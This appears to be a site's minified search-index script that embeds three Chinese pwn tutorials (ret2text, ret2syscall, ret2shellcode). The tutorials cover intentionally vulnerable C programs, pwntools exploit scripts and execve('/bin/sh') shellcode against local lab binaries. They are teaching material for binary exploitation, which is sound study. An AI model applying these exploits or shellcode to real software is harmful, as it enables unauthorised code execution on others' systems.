var suggestions=document.getElementById("suggestions"),search=document.getElementById("search");search!==null&&document.addEventListener("keydown",inputFocus);function inputFocus(e){e.ctrlKey&&e.key==="/"&&(e.preventDefault(),search.focus()),e.key==="Escape"&&(search.blur(),suggestions.classList.add("d-none"))}document.addEventListener("click",function(e){var t=suggestions.contains(e.target);t||suggestions.classList.add("d-none")}),document.addEventListener("keydown",suggestionFocus);function suggestionFocus(e){const s=suggestions.classList.contains("d-none");if(s)return;const t=[...suggestions.querySelectorAll("a")];if(t.length===0)return;const n=t.indexOf(document.activeElement);if(e.key==="ArrowUp"){e.preventDefault();const s=n>0?n-1:0;t[s].focus()}else if(e.key==="ArrowDown"){e.preventDefault();const s=n+1<t.length?n+1:n;t[s].focus()}}(function(){var e=new FlexSearch.Document({tokenize:"forward",cache:100,document:{id:"id",store:["href","title","description"],index:["title","description","content"]}});e.add({id:0,href:"/docs/exploit/stackoverflow/ret2text/",title:"ret2text",description:`0x01 介绍 # 栈是进程最常用到的内存类型之一，它具有高效和简单的特点，主要用来存储函数调用信息。通常来说32位的程序一个栈单元为4个字节，而64位程序一个栈单元为8个字节，然后多个栈单元可以组成一个 栈帧 ，栈帧的大小主要看函数信息的多少。一个栈单元通常包括以下几部分：
函数的参数，一般有父函数压入栈中 函数的返回地址，即函数执行完后ret跳转的地址 帧指针，即上一个栈帧的位置 局部变量，即函数内部声明的变量 栈有三大很重要的作用，同时也体现在栈帧结构里面了：
保存函数的局部变量 函数调用时传递参数 保存函数返回后的地址 而我们所有的栈溢出基本都是围绕着三大作用在进行，包括这里的ret2text题型。这种题型比较简单，它主要利用的是第三大功能，即函数返回地址，我们可以来看一个简单的程序的汇编代码
void main() { int a = 1; int b = 2; } // gcc -m32 test.c -o test -fno-pic -fno-stack-protector -no-pie 生成的汇编代码为
080483db \u0026lt;main\u0026gt;: 80483db: 55 push ebp 80483dc: 89 e5 mov ebp,esp 80483de: 83 ec 10 sub esp,0x10 80483e1: c7 45 fc 01 00 00 00 mov DWORD PTR [ebp-0x4],0x1 80483e8: c7 45 f8 02 00 00 00 mov DWORD PTR [ebp-0x8],0x2 80483ef: 90 nop 80483f0: c9 leave 80483f1: c3 ret 主要关注函数序言和函数尾声，在进入main函数之前，已经由父函数将main函数的返回地址给压入栈中，接着通过函数序言将帧指针压入栈中，并将帧指针的地址赋值给ebp，经过函数体后则进入函数尾声，尾声主要依靠 leave 指令，该指令相当于 mov esp, ebp;pop ebp ，当执行完该指令后当前栈顶就变为了main函数的返回地址，而 ret 指令的作用是跳转到当前栈顶存储的地址处继续执行（即修改eip为当前栈顶存储的那个值），这里也就是main函数的返回地址。`,content:`0x01 介绍 # 栈是进程最常用到的内存类型之一，它具有高效和简单的特点，主要用来存储函数调用信息。通常来说32位的程序一个栈单元为4个字节，而64位程序一个栈单元为8个字节，然后多个栈单元可以组成一个 栈帧 ，栈帧的大小主要看函数信息的多少。一个栈单元通常包括以下几部分：
函数的参数，一般有父函数压入栈中 函数的返回地址，即函数执行完后ret跳转的地址 帧指针，即上一个栈帧的位置 局部变量，即函数内部声明的变量 栈有三大很重要的作用，同时也体现在栈帧结构里面了：
保存函数的局部变量 函数调用时传递参数 保存函数返回后的地址 而我们所有的栈溢出基本都是围绕着三大作用在进行，包括这里的ret2text题型。这种题型比较简单，它主要利用的是第三大功能，即函数返回地址，我们可以来看一个简单的程序的汇编代码
void main() { int a = 1; int b = 2; } // gcc -m32 test.c -o test -fno-pic -fno-stack-protector -no-pie 生成的汇编代码为
080483db \u0026lt;main\u0026gt;: 80483db: 55 push ebp 80483dc: 89 e5 mov ebp,esp 80483de: 83 ec 10 sub esp,0x10 80483e1: c7 45 fc 01 00 00 00 mov DWORD PTR [ebp-0x4],0x1 80483e8: c7 45 f8 02 00 00 00 mov DWORD PTR [ebp-0x8],0x2 80483ef: 90 nop 80483f0: c9 leave 80483f1: c3 ret 主要关注函数序言和函数尾声，在进入main函数之前，已经由父函数将main函数的返回地址给压入栈中，接着通过函数序言将帧指针压入栈中，并将帧指针的地址赋值给ebp，经过函数体后则进入函数尾声，尾声主要依靠 leave 指令，该指令相当于 mov esp, ebp;pop ebp ，当执行完该指令后当前栈顶就变为了main函数的返回地址，而 ret 指令的作用是跳转到当前栈顶存储的地址处继续执行（即修改eip为当前栈顶存储的那个值），这里也就是main函数的返回地址。
而ret2text顾名思义，就是控制 ret 指令跳转的地址（即函数返回地址）为程序里现有的 text 段代码，以达到RCE的过程。至于如何将函数返回地址给修改就需要设计到核心理念 溢出 ，超过容器本身大小的操作就叫溢出。对于C语言来说，每个变量的大小都是固定的（堆以外），学过的都知道C语言不允许动态设置数组的大小，只能是固定值，例如 char a[i] 就是错误的。这时候C语言里有些函数就会变得非常危险，这些危险函数更像是面对人而言并非对程序，比如 gets 函数，它是一个输入函数，可以将你输入的内容存进数组当中，并且只有当人输入 \\n 回车的时候才会截断输入，这样的截断对人来说是合理的，但是对于数组来说一点都不合理，对于数组来说应该是不大于数组大小的输入都是合理的，当你的输入超过数组大小则应该截断。可以 gets 函数并没有这么智能，也就是我们可以对该数组进行溢出的操作。
常见的危险函数有：
gets 函数，遇到 \\n 截断，不保留 \\n 字符串后面添加 \\x00 fgets 函数，遇到 \\n 截断，保留 \\n 并添加 \\x00 scanf 函数 %s 格式化字符串输入，遇到 \\x09 、 \\x0a 、 \\x0b 、 \\x0c 、 \\x0d 、 \\x20 截断，不保留截断字符最后添加 \\x00 sscanf 函数，和 scanf 差不多，多了个 \\x00 截断 str类函数（ strcpy 、 strcat 等）遇到 \\x00 截断，保留 \\x00 read 函数，无截断字符，不添加字符 我们之前说过如果你在函数内部声明一个变量，那么这个就是一个局部变量，存储在栈中，而局部变量邻近的位置并不是空，而是一些其他数据，这时候如果我们通过危险函数对这个局部变量进行溢出，那么我们将可以修改其他数据的内容，只要这个溢出的字节数够多，那么我们就可以修改函数返回地址。
而现有的 text 段代码的话通常会是 system(\u0026quot;/bin/sh\u0026quot;) 、 system(\u0026quot;$0\u0026quot;) 、 execve(\u0026quot;/bin/sh\u0026quot;, 0, 0) 这种直接获取shell进程的函数调用
以一个简单的程序来讲具体实现
#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; void hint() { system(\u0026quot;$0\u0026quot;); } int main() { char buf[0x10]; printf(\u0026quot;input: \u0026quot;); scanf(\u0026quot;%s\u0026quot;, buf); return 0; } // gcc ret2text.c -o ret2text -no-pie -fno-stack-protector 做ret2text记住三大步骤：
找溢出点 计算局部变量到函数返回地址的偏移量 找getshell代码片段地址 根据危险函数列表很容易就可以找到溢出点，即scanf输入处
其次计算偏移量，用IDA有个便捷的方法来计算偏移量，双击上图中的输入变量即v4，可以看到下图
这里 var_10 即变量， s 即帧指针，而 r 则是函数返回地址，左侧的地址是相对偏移地址，右侧是每个数据占据的字节大小，可以很容易计算出变量到函数返回地址之间有16+8=24字节的偏移量
最后找getshell代码片段
你可以直接用hint函数地址，也可以只用从给system函数传递参数处的指令开始，两者结果是一样的
最后我们就可以编写攻击脚本了
from pwn import* # 引入pwntools包 o = process(\u0026quot;./ret2text\u0026quot;) # 执行ret2text程序并获取其I/O接口 payload = b'a'*24 # 填充变量与函数返回地址的空隙 payload += p64(0x4005d6) # 0x4005d6是getshell代码片段地址，p64的作用是将地址打包成小端序填入栈单元 o.sendline(payload) # 发送payload，会在结尾加 '\\n' o.interactive() # 进入交互模式 `}),e.add({id:1,href:"/docs/exploit/stackoverflow/ret2syscall/",title:"ret2syscall",description:`0x01 介绍 # syscall又称为系统调用，是操作系统给用户的API接口，可以用来使用电脑资源。首先需要来熟悉系统调用的使用方式，对于32程序来说是通过 int 0x80 指令来执行系统调用，而64位程序则是通过 syscall 指令来执行。在执行命令前，需要把参数和系统调用号准备好，系统调用号是操作系统分配给不同系统调用的一个数字，以便内核区分它们，我们可以在 /usr/include/asm/unistd.h 找到32位和64位的系统调用号分别存储的文件
我们可以看一下32位的系统调用号
前部分是系统调用名称，比如 __NR_read 就是read系统调用，而后半部分就是系统调用号，都是数字，例如 3 就是read的系统调用号0。64位的系统调用号也是同理。
当执行内陷指令之前，需要将系统调用号传入ax寄存器中。其次需要在执行内陷指令前要做的就是传递参数给内核，这里不管是32位还是64位的程序都必须用寄存器来传递参数。对于32位来说，参数寄存器的传递顺序是 ebx、ecx、edx、esi、edi ，对于64位来说顺序为 rdi、rsi、rdx、rcx、r8、r9 。我们以内联汇编的形式来实现一个简单的系统调用
char *buf = \u0026quot;hello world\\n\u0026quot;; void main(); asm( \u0026quot;.text\\n\u0026quot; \u0026quot;.global main\\n\u0026quot; \u0026quot;main:\\n\u0026quot; // write(1, \u0026quot;hello world\\n\u0026quot;, 12) \u0026quot;mov ebx, 1\\n\u0026quot; // 第一个参数，标准输出流 \u0026quot;mov ecx, buf\\n\u0026quot; // 第二个参数，字符串地址 \u0026quot;mov edx, 12\\n\u0026quot; // 第三个参数，输出字节数 \u0026quot;mov eax, 4\\n\u0026quot; // write的系统调用号 \u0026quot;int 0x80\\n\u0026quot; // 内陷指令 ); // gcc test.c -o test -m32 -masm=intel 运行效果为`,content:`0x01 介绍 # syscall又称为系统调用，是操作系统给用户的API接口，可以用来使用电脑资源。首先需要来熟悉系统调用的使用方式，对于32程序来说是通过 int 0x80 指令来执行系统调用，而64位程序则是通过 syscall 指令来执行。在执行命令前，需要把参数和系统调用号准备好，系统调用号是操作系统分配给不同系统调用的一个数字，以便内核区分它们，我们可以在 /usr/include/asm/unistd.h 找到32位和64位的系统调用号分别存储的文件
我们可以看一下32位的系统调用号
前部分是系统调用名称，比如 __NR_read 就是read系统调用，而后半部分就是系统调用号，都是数字，例如 3 就是read的系统调用号0。64位的系统调用号也是同理。
当执行内陷指令之前，需要将系统调用号传入ax寄存器中。其次需要在执行内陷指令前要做的就是传递参数给内核，这里不管是32位还是64位的程序都必须用寄存器来传递参数。对于32位来说，参数寄存器的传递顺序是 ebx、ecx、edx、esi、edi ，对于64位来说顺序为 rdi、rsi、rdx、rcx、r8、r9 。我们以内联汇编的形式来实现一个简单的系统调用
char *buf = \u0026quot;hello world\\n\u0026quot;; void main(); asm( \u0026quot;.text\\n\u0026quot; \u0026quot;.global main\\n\u0026quot; \u0026quot;main:\\n\u0026quot; // write(1, \u0026quot;hello world\\n\u0026quot;, 12) \u0026quot;mov ebx, 1\\n\u0026quot; // 第一个参数，标准输出流 \u0026quot;mov ecx, buf\\n\u0026quot; // 第二个参数，字符串地址 \u0026quot;mov edx, 12\\n\u0026quot; // 第三个参数，输出字节数 \u0026quot;mov eax, 4\\n\u0026quot; // write的系统调用号 \u0026quot;int 0x80\\n\u0026quot; // 内陷指令 ); // gcc test.c -o test -m32 -masm=intel 运行效果为
而ret2syscall它要完成的就是去调用某个系统调用来完成getshell的操作。ret2syscall作为ROP系列之一，它的核心还是溢出，不过它的难点就在于溢出后的步骤。之前的ret2text是直接返回到程序中已有的getshell代码片段，ret2syscall则没有现成的getshell代码片段出现，它获取shell的方式是通过多个代码片段之间的跳转执行，我们称这多个代码片段组成的类似于链状的执行过程称为ROP链。大概流程如下
大概来解释这幅图，首先当执行到函数的ret指令时，ret会跳转到当前栈顶指向的代码处执行，并将当前栈顶移动到下一个栈单元，这里我们将其覆盖成了修改参数寄存器代码片段的地址，接下来一段时间都会去执行修改参数寄存器的操作，直到执行到代码片段的ret指令，对于这条ret指令来说其跳转的地址就是图中第一条虚线即修改ax寄存器的代码片段的地址（应为当前栈顶就是该栈单元），接着就会去执行修改ax寄存器的代码，直到执行到其ret指令处，对于它的ret指令来说返回地址是第二条虚线即内陷指令地址，最后跳转执行内陷指令后即可获取到shell。当然实际情况可能会比这个复杂很多。
对于ret2syscall来说有几个代码片段是必须要有的，首先就是内陷指令片段，正常的程序一般不会有内陷指令，如果有内陷指令的题目大概路就是ret2syscall的方式去解决。其次就是控制ax寄存器的指令，只有控制了ax寄存器才可以设定我们想要的系统调用号。最后就是设定参数的代码片段，每个参数寄存器必须设置为指定的值，否则大概率都是执行失败。
我们以一个例子来说
#include\u0026lt;stdio.h\u0026gt; char *bin_sh = \u0026quot;/bin/sh\u0026quot;; void hint(); asm( \u0026quot;.text\\n\u0026quot; \u0026quot;.global hint\\n\u0026quot; \u0026quot;hint:\\n\u0026quot; \u0026quot;inc eax\\n\u0026quot; \u0026quot;ret\\n\u0026quot; \u0026quot;xor eax, eax\\n\u0026quot; \u0026quot;xor ebx, ebx\\n\u0026quot; \u0026quot;xor ecx, ecx\\n\u0026quot; \u0026quot;xor edx, edx\\n\u0026quot; \u0026quot;ret\\n\u0026quot; \u0026quot;int 0x80\u0026quot; ); void run() { char buf[0x10]; printf(\u0026quot;input: \u0026quot;); scanf(\u0026quot;%s\u0026quot;, buf); } int main() { run(); return 0; } // gcc ret2syscall.c -o ret2syscall -no-pie -fno-pic -fno-stack-protector -m32 -masm=intel 这里我们以内联汇编的方式写了一些必要的代码片段以完成ret2syscall的操作。在ret2syscall中获取shell的系统调用只有一种即 execve 系统调用，它的作用就是执行一个新的程序。execve接收三个参数，第一个参数是程序名称，第二个参数是给程序的参数，第三个参数是环境参数，对于shell来说只需要第一个参数设置为 /bin/sh 即可，后两个为null即0就行。
首先是找到修改参数寄存器的代码片段，在上面的源文件中可以很明显看到有 xor ecx, ecx; xor edx, edx 这两条指令可以完成第二、三两个参数寄存器的设置。而对于第一个参数寄存器的设置则需要通过其他指令来完成，通常寻找的是 pop ebx; ret 代码片段，该代码片段会将当前栈顶的值弹出存入到ebx中并返回下一个栈单元，如果我们在栈顶存入 /bin/sh 字符串地址则可以直接完成第一个参数寄存器的设置
所有的参数寄存器都执行完成后即可对ax寄存器进行设置，这里存在一个 inc eax; ret 代码片段，它可以对eax进行加一的操作，我们只要多次执行这个代码片段直到ax寄存器为execve系统调用号的值就行。最后既可以跳转去执行内陷指令获取shell了。所以整个的栈布局为
建议可以调试看看具体的ROP链执行过程
然后我们需要找出这些代码片段的地址，这里可以使用 ROPgadget 工具来查找
而execve的系统调用号在文件中可以查到为 11 ，通过调试我们可以知道当run函数执行到ret指令的时候eax寄存器的值为1。
所以inc指令只需要执行10次即可。最终可以写出Exploit
from pwn import* o = process(\u0026quot;./ret2syscall\u0026quot;) bin_sh = 0x8048550 # /bin/sh字符串地址 pop_ebx = 0x8048311 # pop ebx;ret代码片段地址 xor_ret = 0x8048471 # xor ecx, ecx;xor edx, edx;ret代码片段地址 int_80 = 0x8048476 # int 0x80代码片段地址 inc_eax = 0x804846b # inc eax;ret代码片段地址 payload = b'a'*28 # 填充局部变量和函数返回地址之间的空隙 payload += p32(pop_ebx) + p32(bin_sh) # 设置第一个参数寄存器 payload += p32(xor_ret) # 设置第二三个参数寄存器 payload += p32(inc_eax)*10 # eax累加到11 payload += p32(int_80) # 执行系统调用 o.sendline(payload) o.interactive() `}),e.add({id:2,href:"/docs/exploit/stackoverflow/ret2shellcode/",title:"Ret2shellcode",description:`0x01 介绍 # ret2shellcode用到的知识也是系统调用，只不过和ret2syscall的区别在于后者是利用程序里已有的代码片段，而前者是需要自己写系统调用代码编译后注入到内存里，然后跳转到我们写入的地方来执行我们写入的代码，我们称这种代码为shellcode。这种题型的难点就在于shellcode编写，其他的和前面区别不大。最简单的shellcode即execve系统调用的写法为
获取 /bin/sh 字符串地址 将字符串地址赋值给第一个参数寄存器 将第二三参数寄存器置零 将系统调用号存入ax寄存器 执行内陷指令 32位的汇编代码为
push 0x0068732f push 0x6e69622f # \u0026quot;/bin/sh\u0026quot;字符串按照小端序压入到栈中 mov ebx, esp # 当前栈顶即esp指向的是\u0026quot;/bin/sh\u0026quot;字符串，将esp的值即字符串指针赋值给ebx xor ecx, ecx # ecx置零 xor edx, edx # edx置零 mov eax, 11 # 将execve系统调用号给eax int 0x80 # 执行系统调用 64位的汇编代码为
mov rax, 0x0068732f6e69622f push rax mov rdi, rsp xor rsi, rsi xor rdx, rdx mov rax, 59 syscall 值得注意的是64位不能直接将8个字节直接push进栈里，必须借助寄存器才可以将 /bin/sh 字符串压入栈中
将汇编编译为机器码后注入到内存里即可。在此之前需要保存注入shellcode的地方有可执行权限，最常见的情况就是没有加 NX 保护，然后可以注入到堆栈、data段bss段。还有的情况就是使用mmap申请了一个有可执行权限的内存，例如
char *p = mmap(0x10000, 0x1000, 7, 0x22, -1, 0) 第一个参数是申请内存开始的地址，第二个参数是申请的内存大小，需要为内存分页的倍数（4KB的倍数），第三个参数是内存权限，可读为1，可写为2，可执行为4，通过或运算可以知道可读可写可执行的值为7，0x22是 MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED ，代表这是一个私有的映射（别的进程不可访问），还是一个匿名映射（不和任何文件相关联），而且映射区域映射到指定的起始地址，第四个参数是文件描述符，如果是匿名映射，填-1即可，最后一个参数是指定要映射文件的偏移量，可以填0不用管`,content:`0x01 介绍 # ret2shellcode用到的知识也是系统调用，只不过和ret2syscall的区别在于后者是利用程序里已有的代码片段，而前者是需要自己写系统调用代码编译后注入到内存里，然后跳转到我们写入的地方来执行我们写入的代码，我们称这种代码为shellcode。这种题型的难点就在于shellcode编写，其他的和前面区别不大。最简单的shellcode即execve系统调用的写法为
获取 /bin/sh 字符串地址 将字符串地址赋值给第一个参数寄存器 将第二三参数寄存器置零 将系统调用号存入ax寄存器 执行内陷指令 32位的汇编代码为
push 0x0068732f push 0x6e69622f # \u0026quot;/bin/sh\u0026quot;字符串按照小端序压入到栈中 mov ebx, esp # 当前栈顶即esp指向的是\u0026quot;/bin/sh\u0026quot;字符串，将esp的值即字符串指针赋值给ebx xor ecx, ecx # ecx置零 xor edx, edx # edx置零 mov eax, 11 # 将execve系统调用号给eax int 0x80 # 执行系统调用 64位的汇编代码为
mov rax, 0x0068732f6e69622f push rax mov rdi, rsp xor rsi, rsi xor rdx, rdx mov rax, 59 syscall 值得注意的是64位不能直接将8个字节直接push进栈里，必须借助寄存器才可以将 /bin/sh 字符串压入栈中
将汇编编译为机器码后注入到内存里即可。在此之前需要保存注入shellcode的地方有可执行权限，最常见的情况就是没有加 NX 保护，然后可以注入到堆栈、data段bss段。还有的情况就是使用mmap申请了一个有可执行权限的内存，例如
char *p = mmap(0x10000, 0x1000, 7, 0x22, -1, 0) 第一个参数是申请内存开始的地址，第二个参数是申请的内存大小，需要为内存分页的倍数（4KB的倍数），第三个参数是内存权限，可读为1，可写为2，可执行为4，通过或运算可以知道可读可写可执行的值为7，0x22是 MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED ，代表这是一个私有的映射（别的进程不可访问），还是一个匿名映射（不和任何文件相关联），而且映射区域映射到指定的起始地址，第四个参数是文件描述符，如果是匿名映射，填-1即可，最后一个参数是指定要映射文件的偏移量，可以填0不用管
这样我们在0x10000地址处就有了一个可以写入执行shellcode的内存了
还有一种情况是通过mprotect更改内存区域的权限，例如
mprotect(0x10000, 0x1000, 7) 第一个参数是你要修改内存区域的地址，第二个参数是区域的长度，也需要是内存分页的倍数，最后一个参数是权限，和mmap的权限一样。
值得注意的是mmap和mprotect都是有系统调用存在的
我们以最简单的没加 NX 保护的情况来讲
#include\u0026lt;stdio.h\u0026gt; char buf[0x50]; void run() { char name[0x10]; printf(\u0026quot;name: \u0026quot;); scanf(\u0026quot;%s\u0026quot;, name); printf(\u0026quot;content: \u0026quot;); scanf(\u0026quot;%s\u0026quot;, buf); } int main() { run(); return 0; } // gcc ret2shellcode.c -o ret2shellcode -m32 -no-pie -fno-pic -fno-stack-protector -z execstack 这里第一次输入存在栈溢出，而第二次输入是输入到buf中，buf是未初始化数组，保存在了bss段中，由于没有加PIE保护，所以buf地址是已知的，那么我们就可以将shellcode注入到buf中，然后覆盖函数返回地址为buf地址，即可通过ret跳转执行我们的shellcode
这样我们就可以写出最终的Exploit
from pwn import* context.log_level = 'debug' # 设置为调试模式 context.arch = 'i386' # 设置系统架构，要不然编译汇编代码会出错 o = process(\u0026quot;./ret2shellcode\u0026quot;) # 第一次输入，栈溢出覆盖函数返回地址为buf地址 payload = b'a'*28 + p32(0x804a040) o.sendline(payload) # execve(\u0026quot;/bin/sh\u0026quot;, 0, 0) shellcode = ''' push 0x0068732f push 0x6e69622f push esp pop ebx xor ecx, ecx xor edx, edx mov eax, 59 xor eax, 48 # 由于11是scanf的截断字符，所以通过先将eax赋值为59，再将eax和48异或eax即可得到11 int 0x80 ''' payload = asm(shellcode) # 编译汇编代码 o.sendline(payload) # 将编译好的机器码写入到buf中 o.interactive() 建议调试看看具体过程
`}),e.add({id:3,href:"/docs/exploit/",title:"Exploit",description:"",content:""}),e.add({id:4,href:"/docs/exploit/stackoverflow/",title:"Stackoverflow",description:"",content:""}),e.add({id:5,href:"/docs/",title:"Docs",description:"Docs Doks.",content:""}),search.addEventListener("input",t,!0);function t(){const s=5;var n=this.value,o=e.search(n,{limit:s,enrich:!0});const t=new Map;for(const e of o.flatMap(e=>e.result)){if(t.has(e.doc.href))continue;t.set(e.doc.href,e.doc)}if(suggestions.innerHTML="",suggestions.classList.remove("d-none"),t.size===0&&n){const e=document.createElement("div");e.innerHTML=`No results for "<strong>${n}</strong>"`,e.classList.add("suggestion__no-results"),suggestions.appendChild(e);return}for(const[r,a]of t){const n=document.createElement("div");suggestions.appendChild(n);const e=document.createElement("a");e.href=r,n.appendChild(e);const o=document.createElement("span");o.textContent=a.title,o.classList.add("suggestion__title"),e.appendChild(o);const i=document.createElement("span");if(i.textContent=a.description,i.classList.add("suggestion__description"),e.appendChild(i),suggestions.appendChild(n),suggestions.childElementCount==s)break}}})()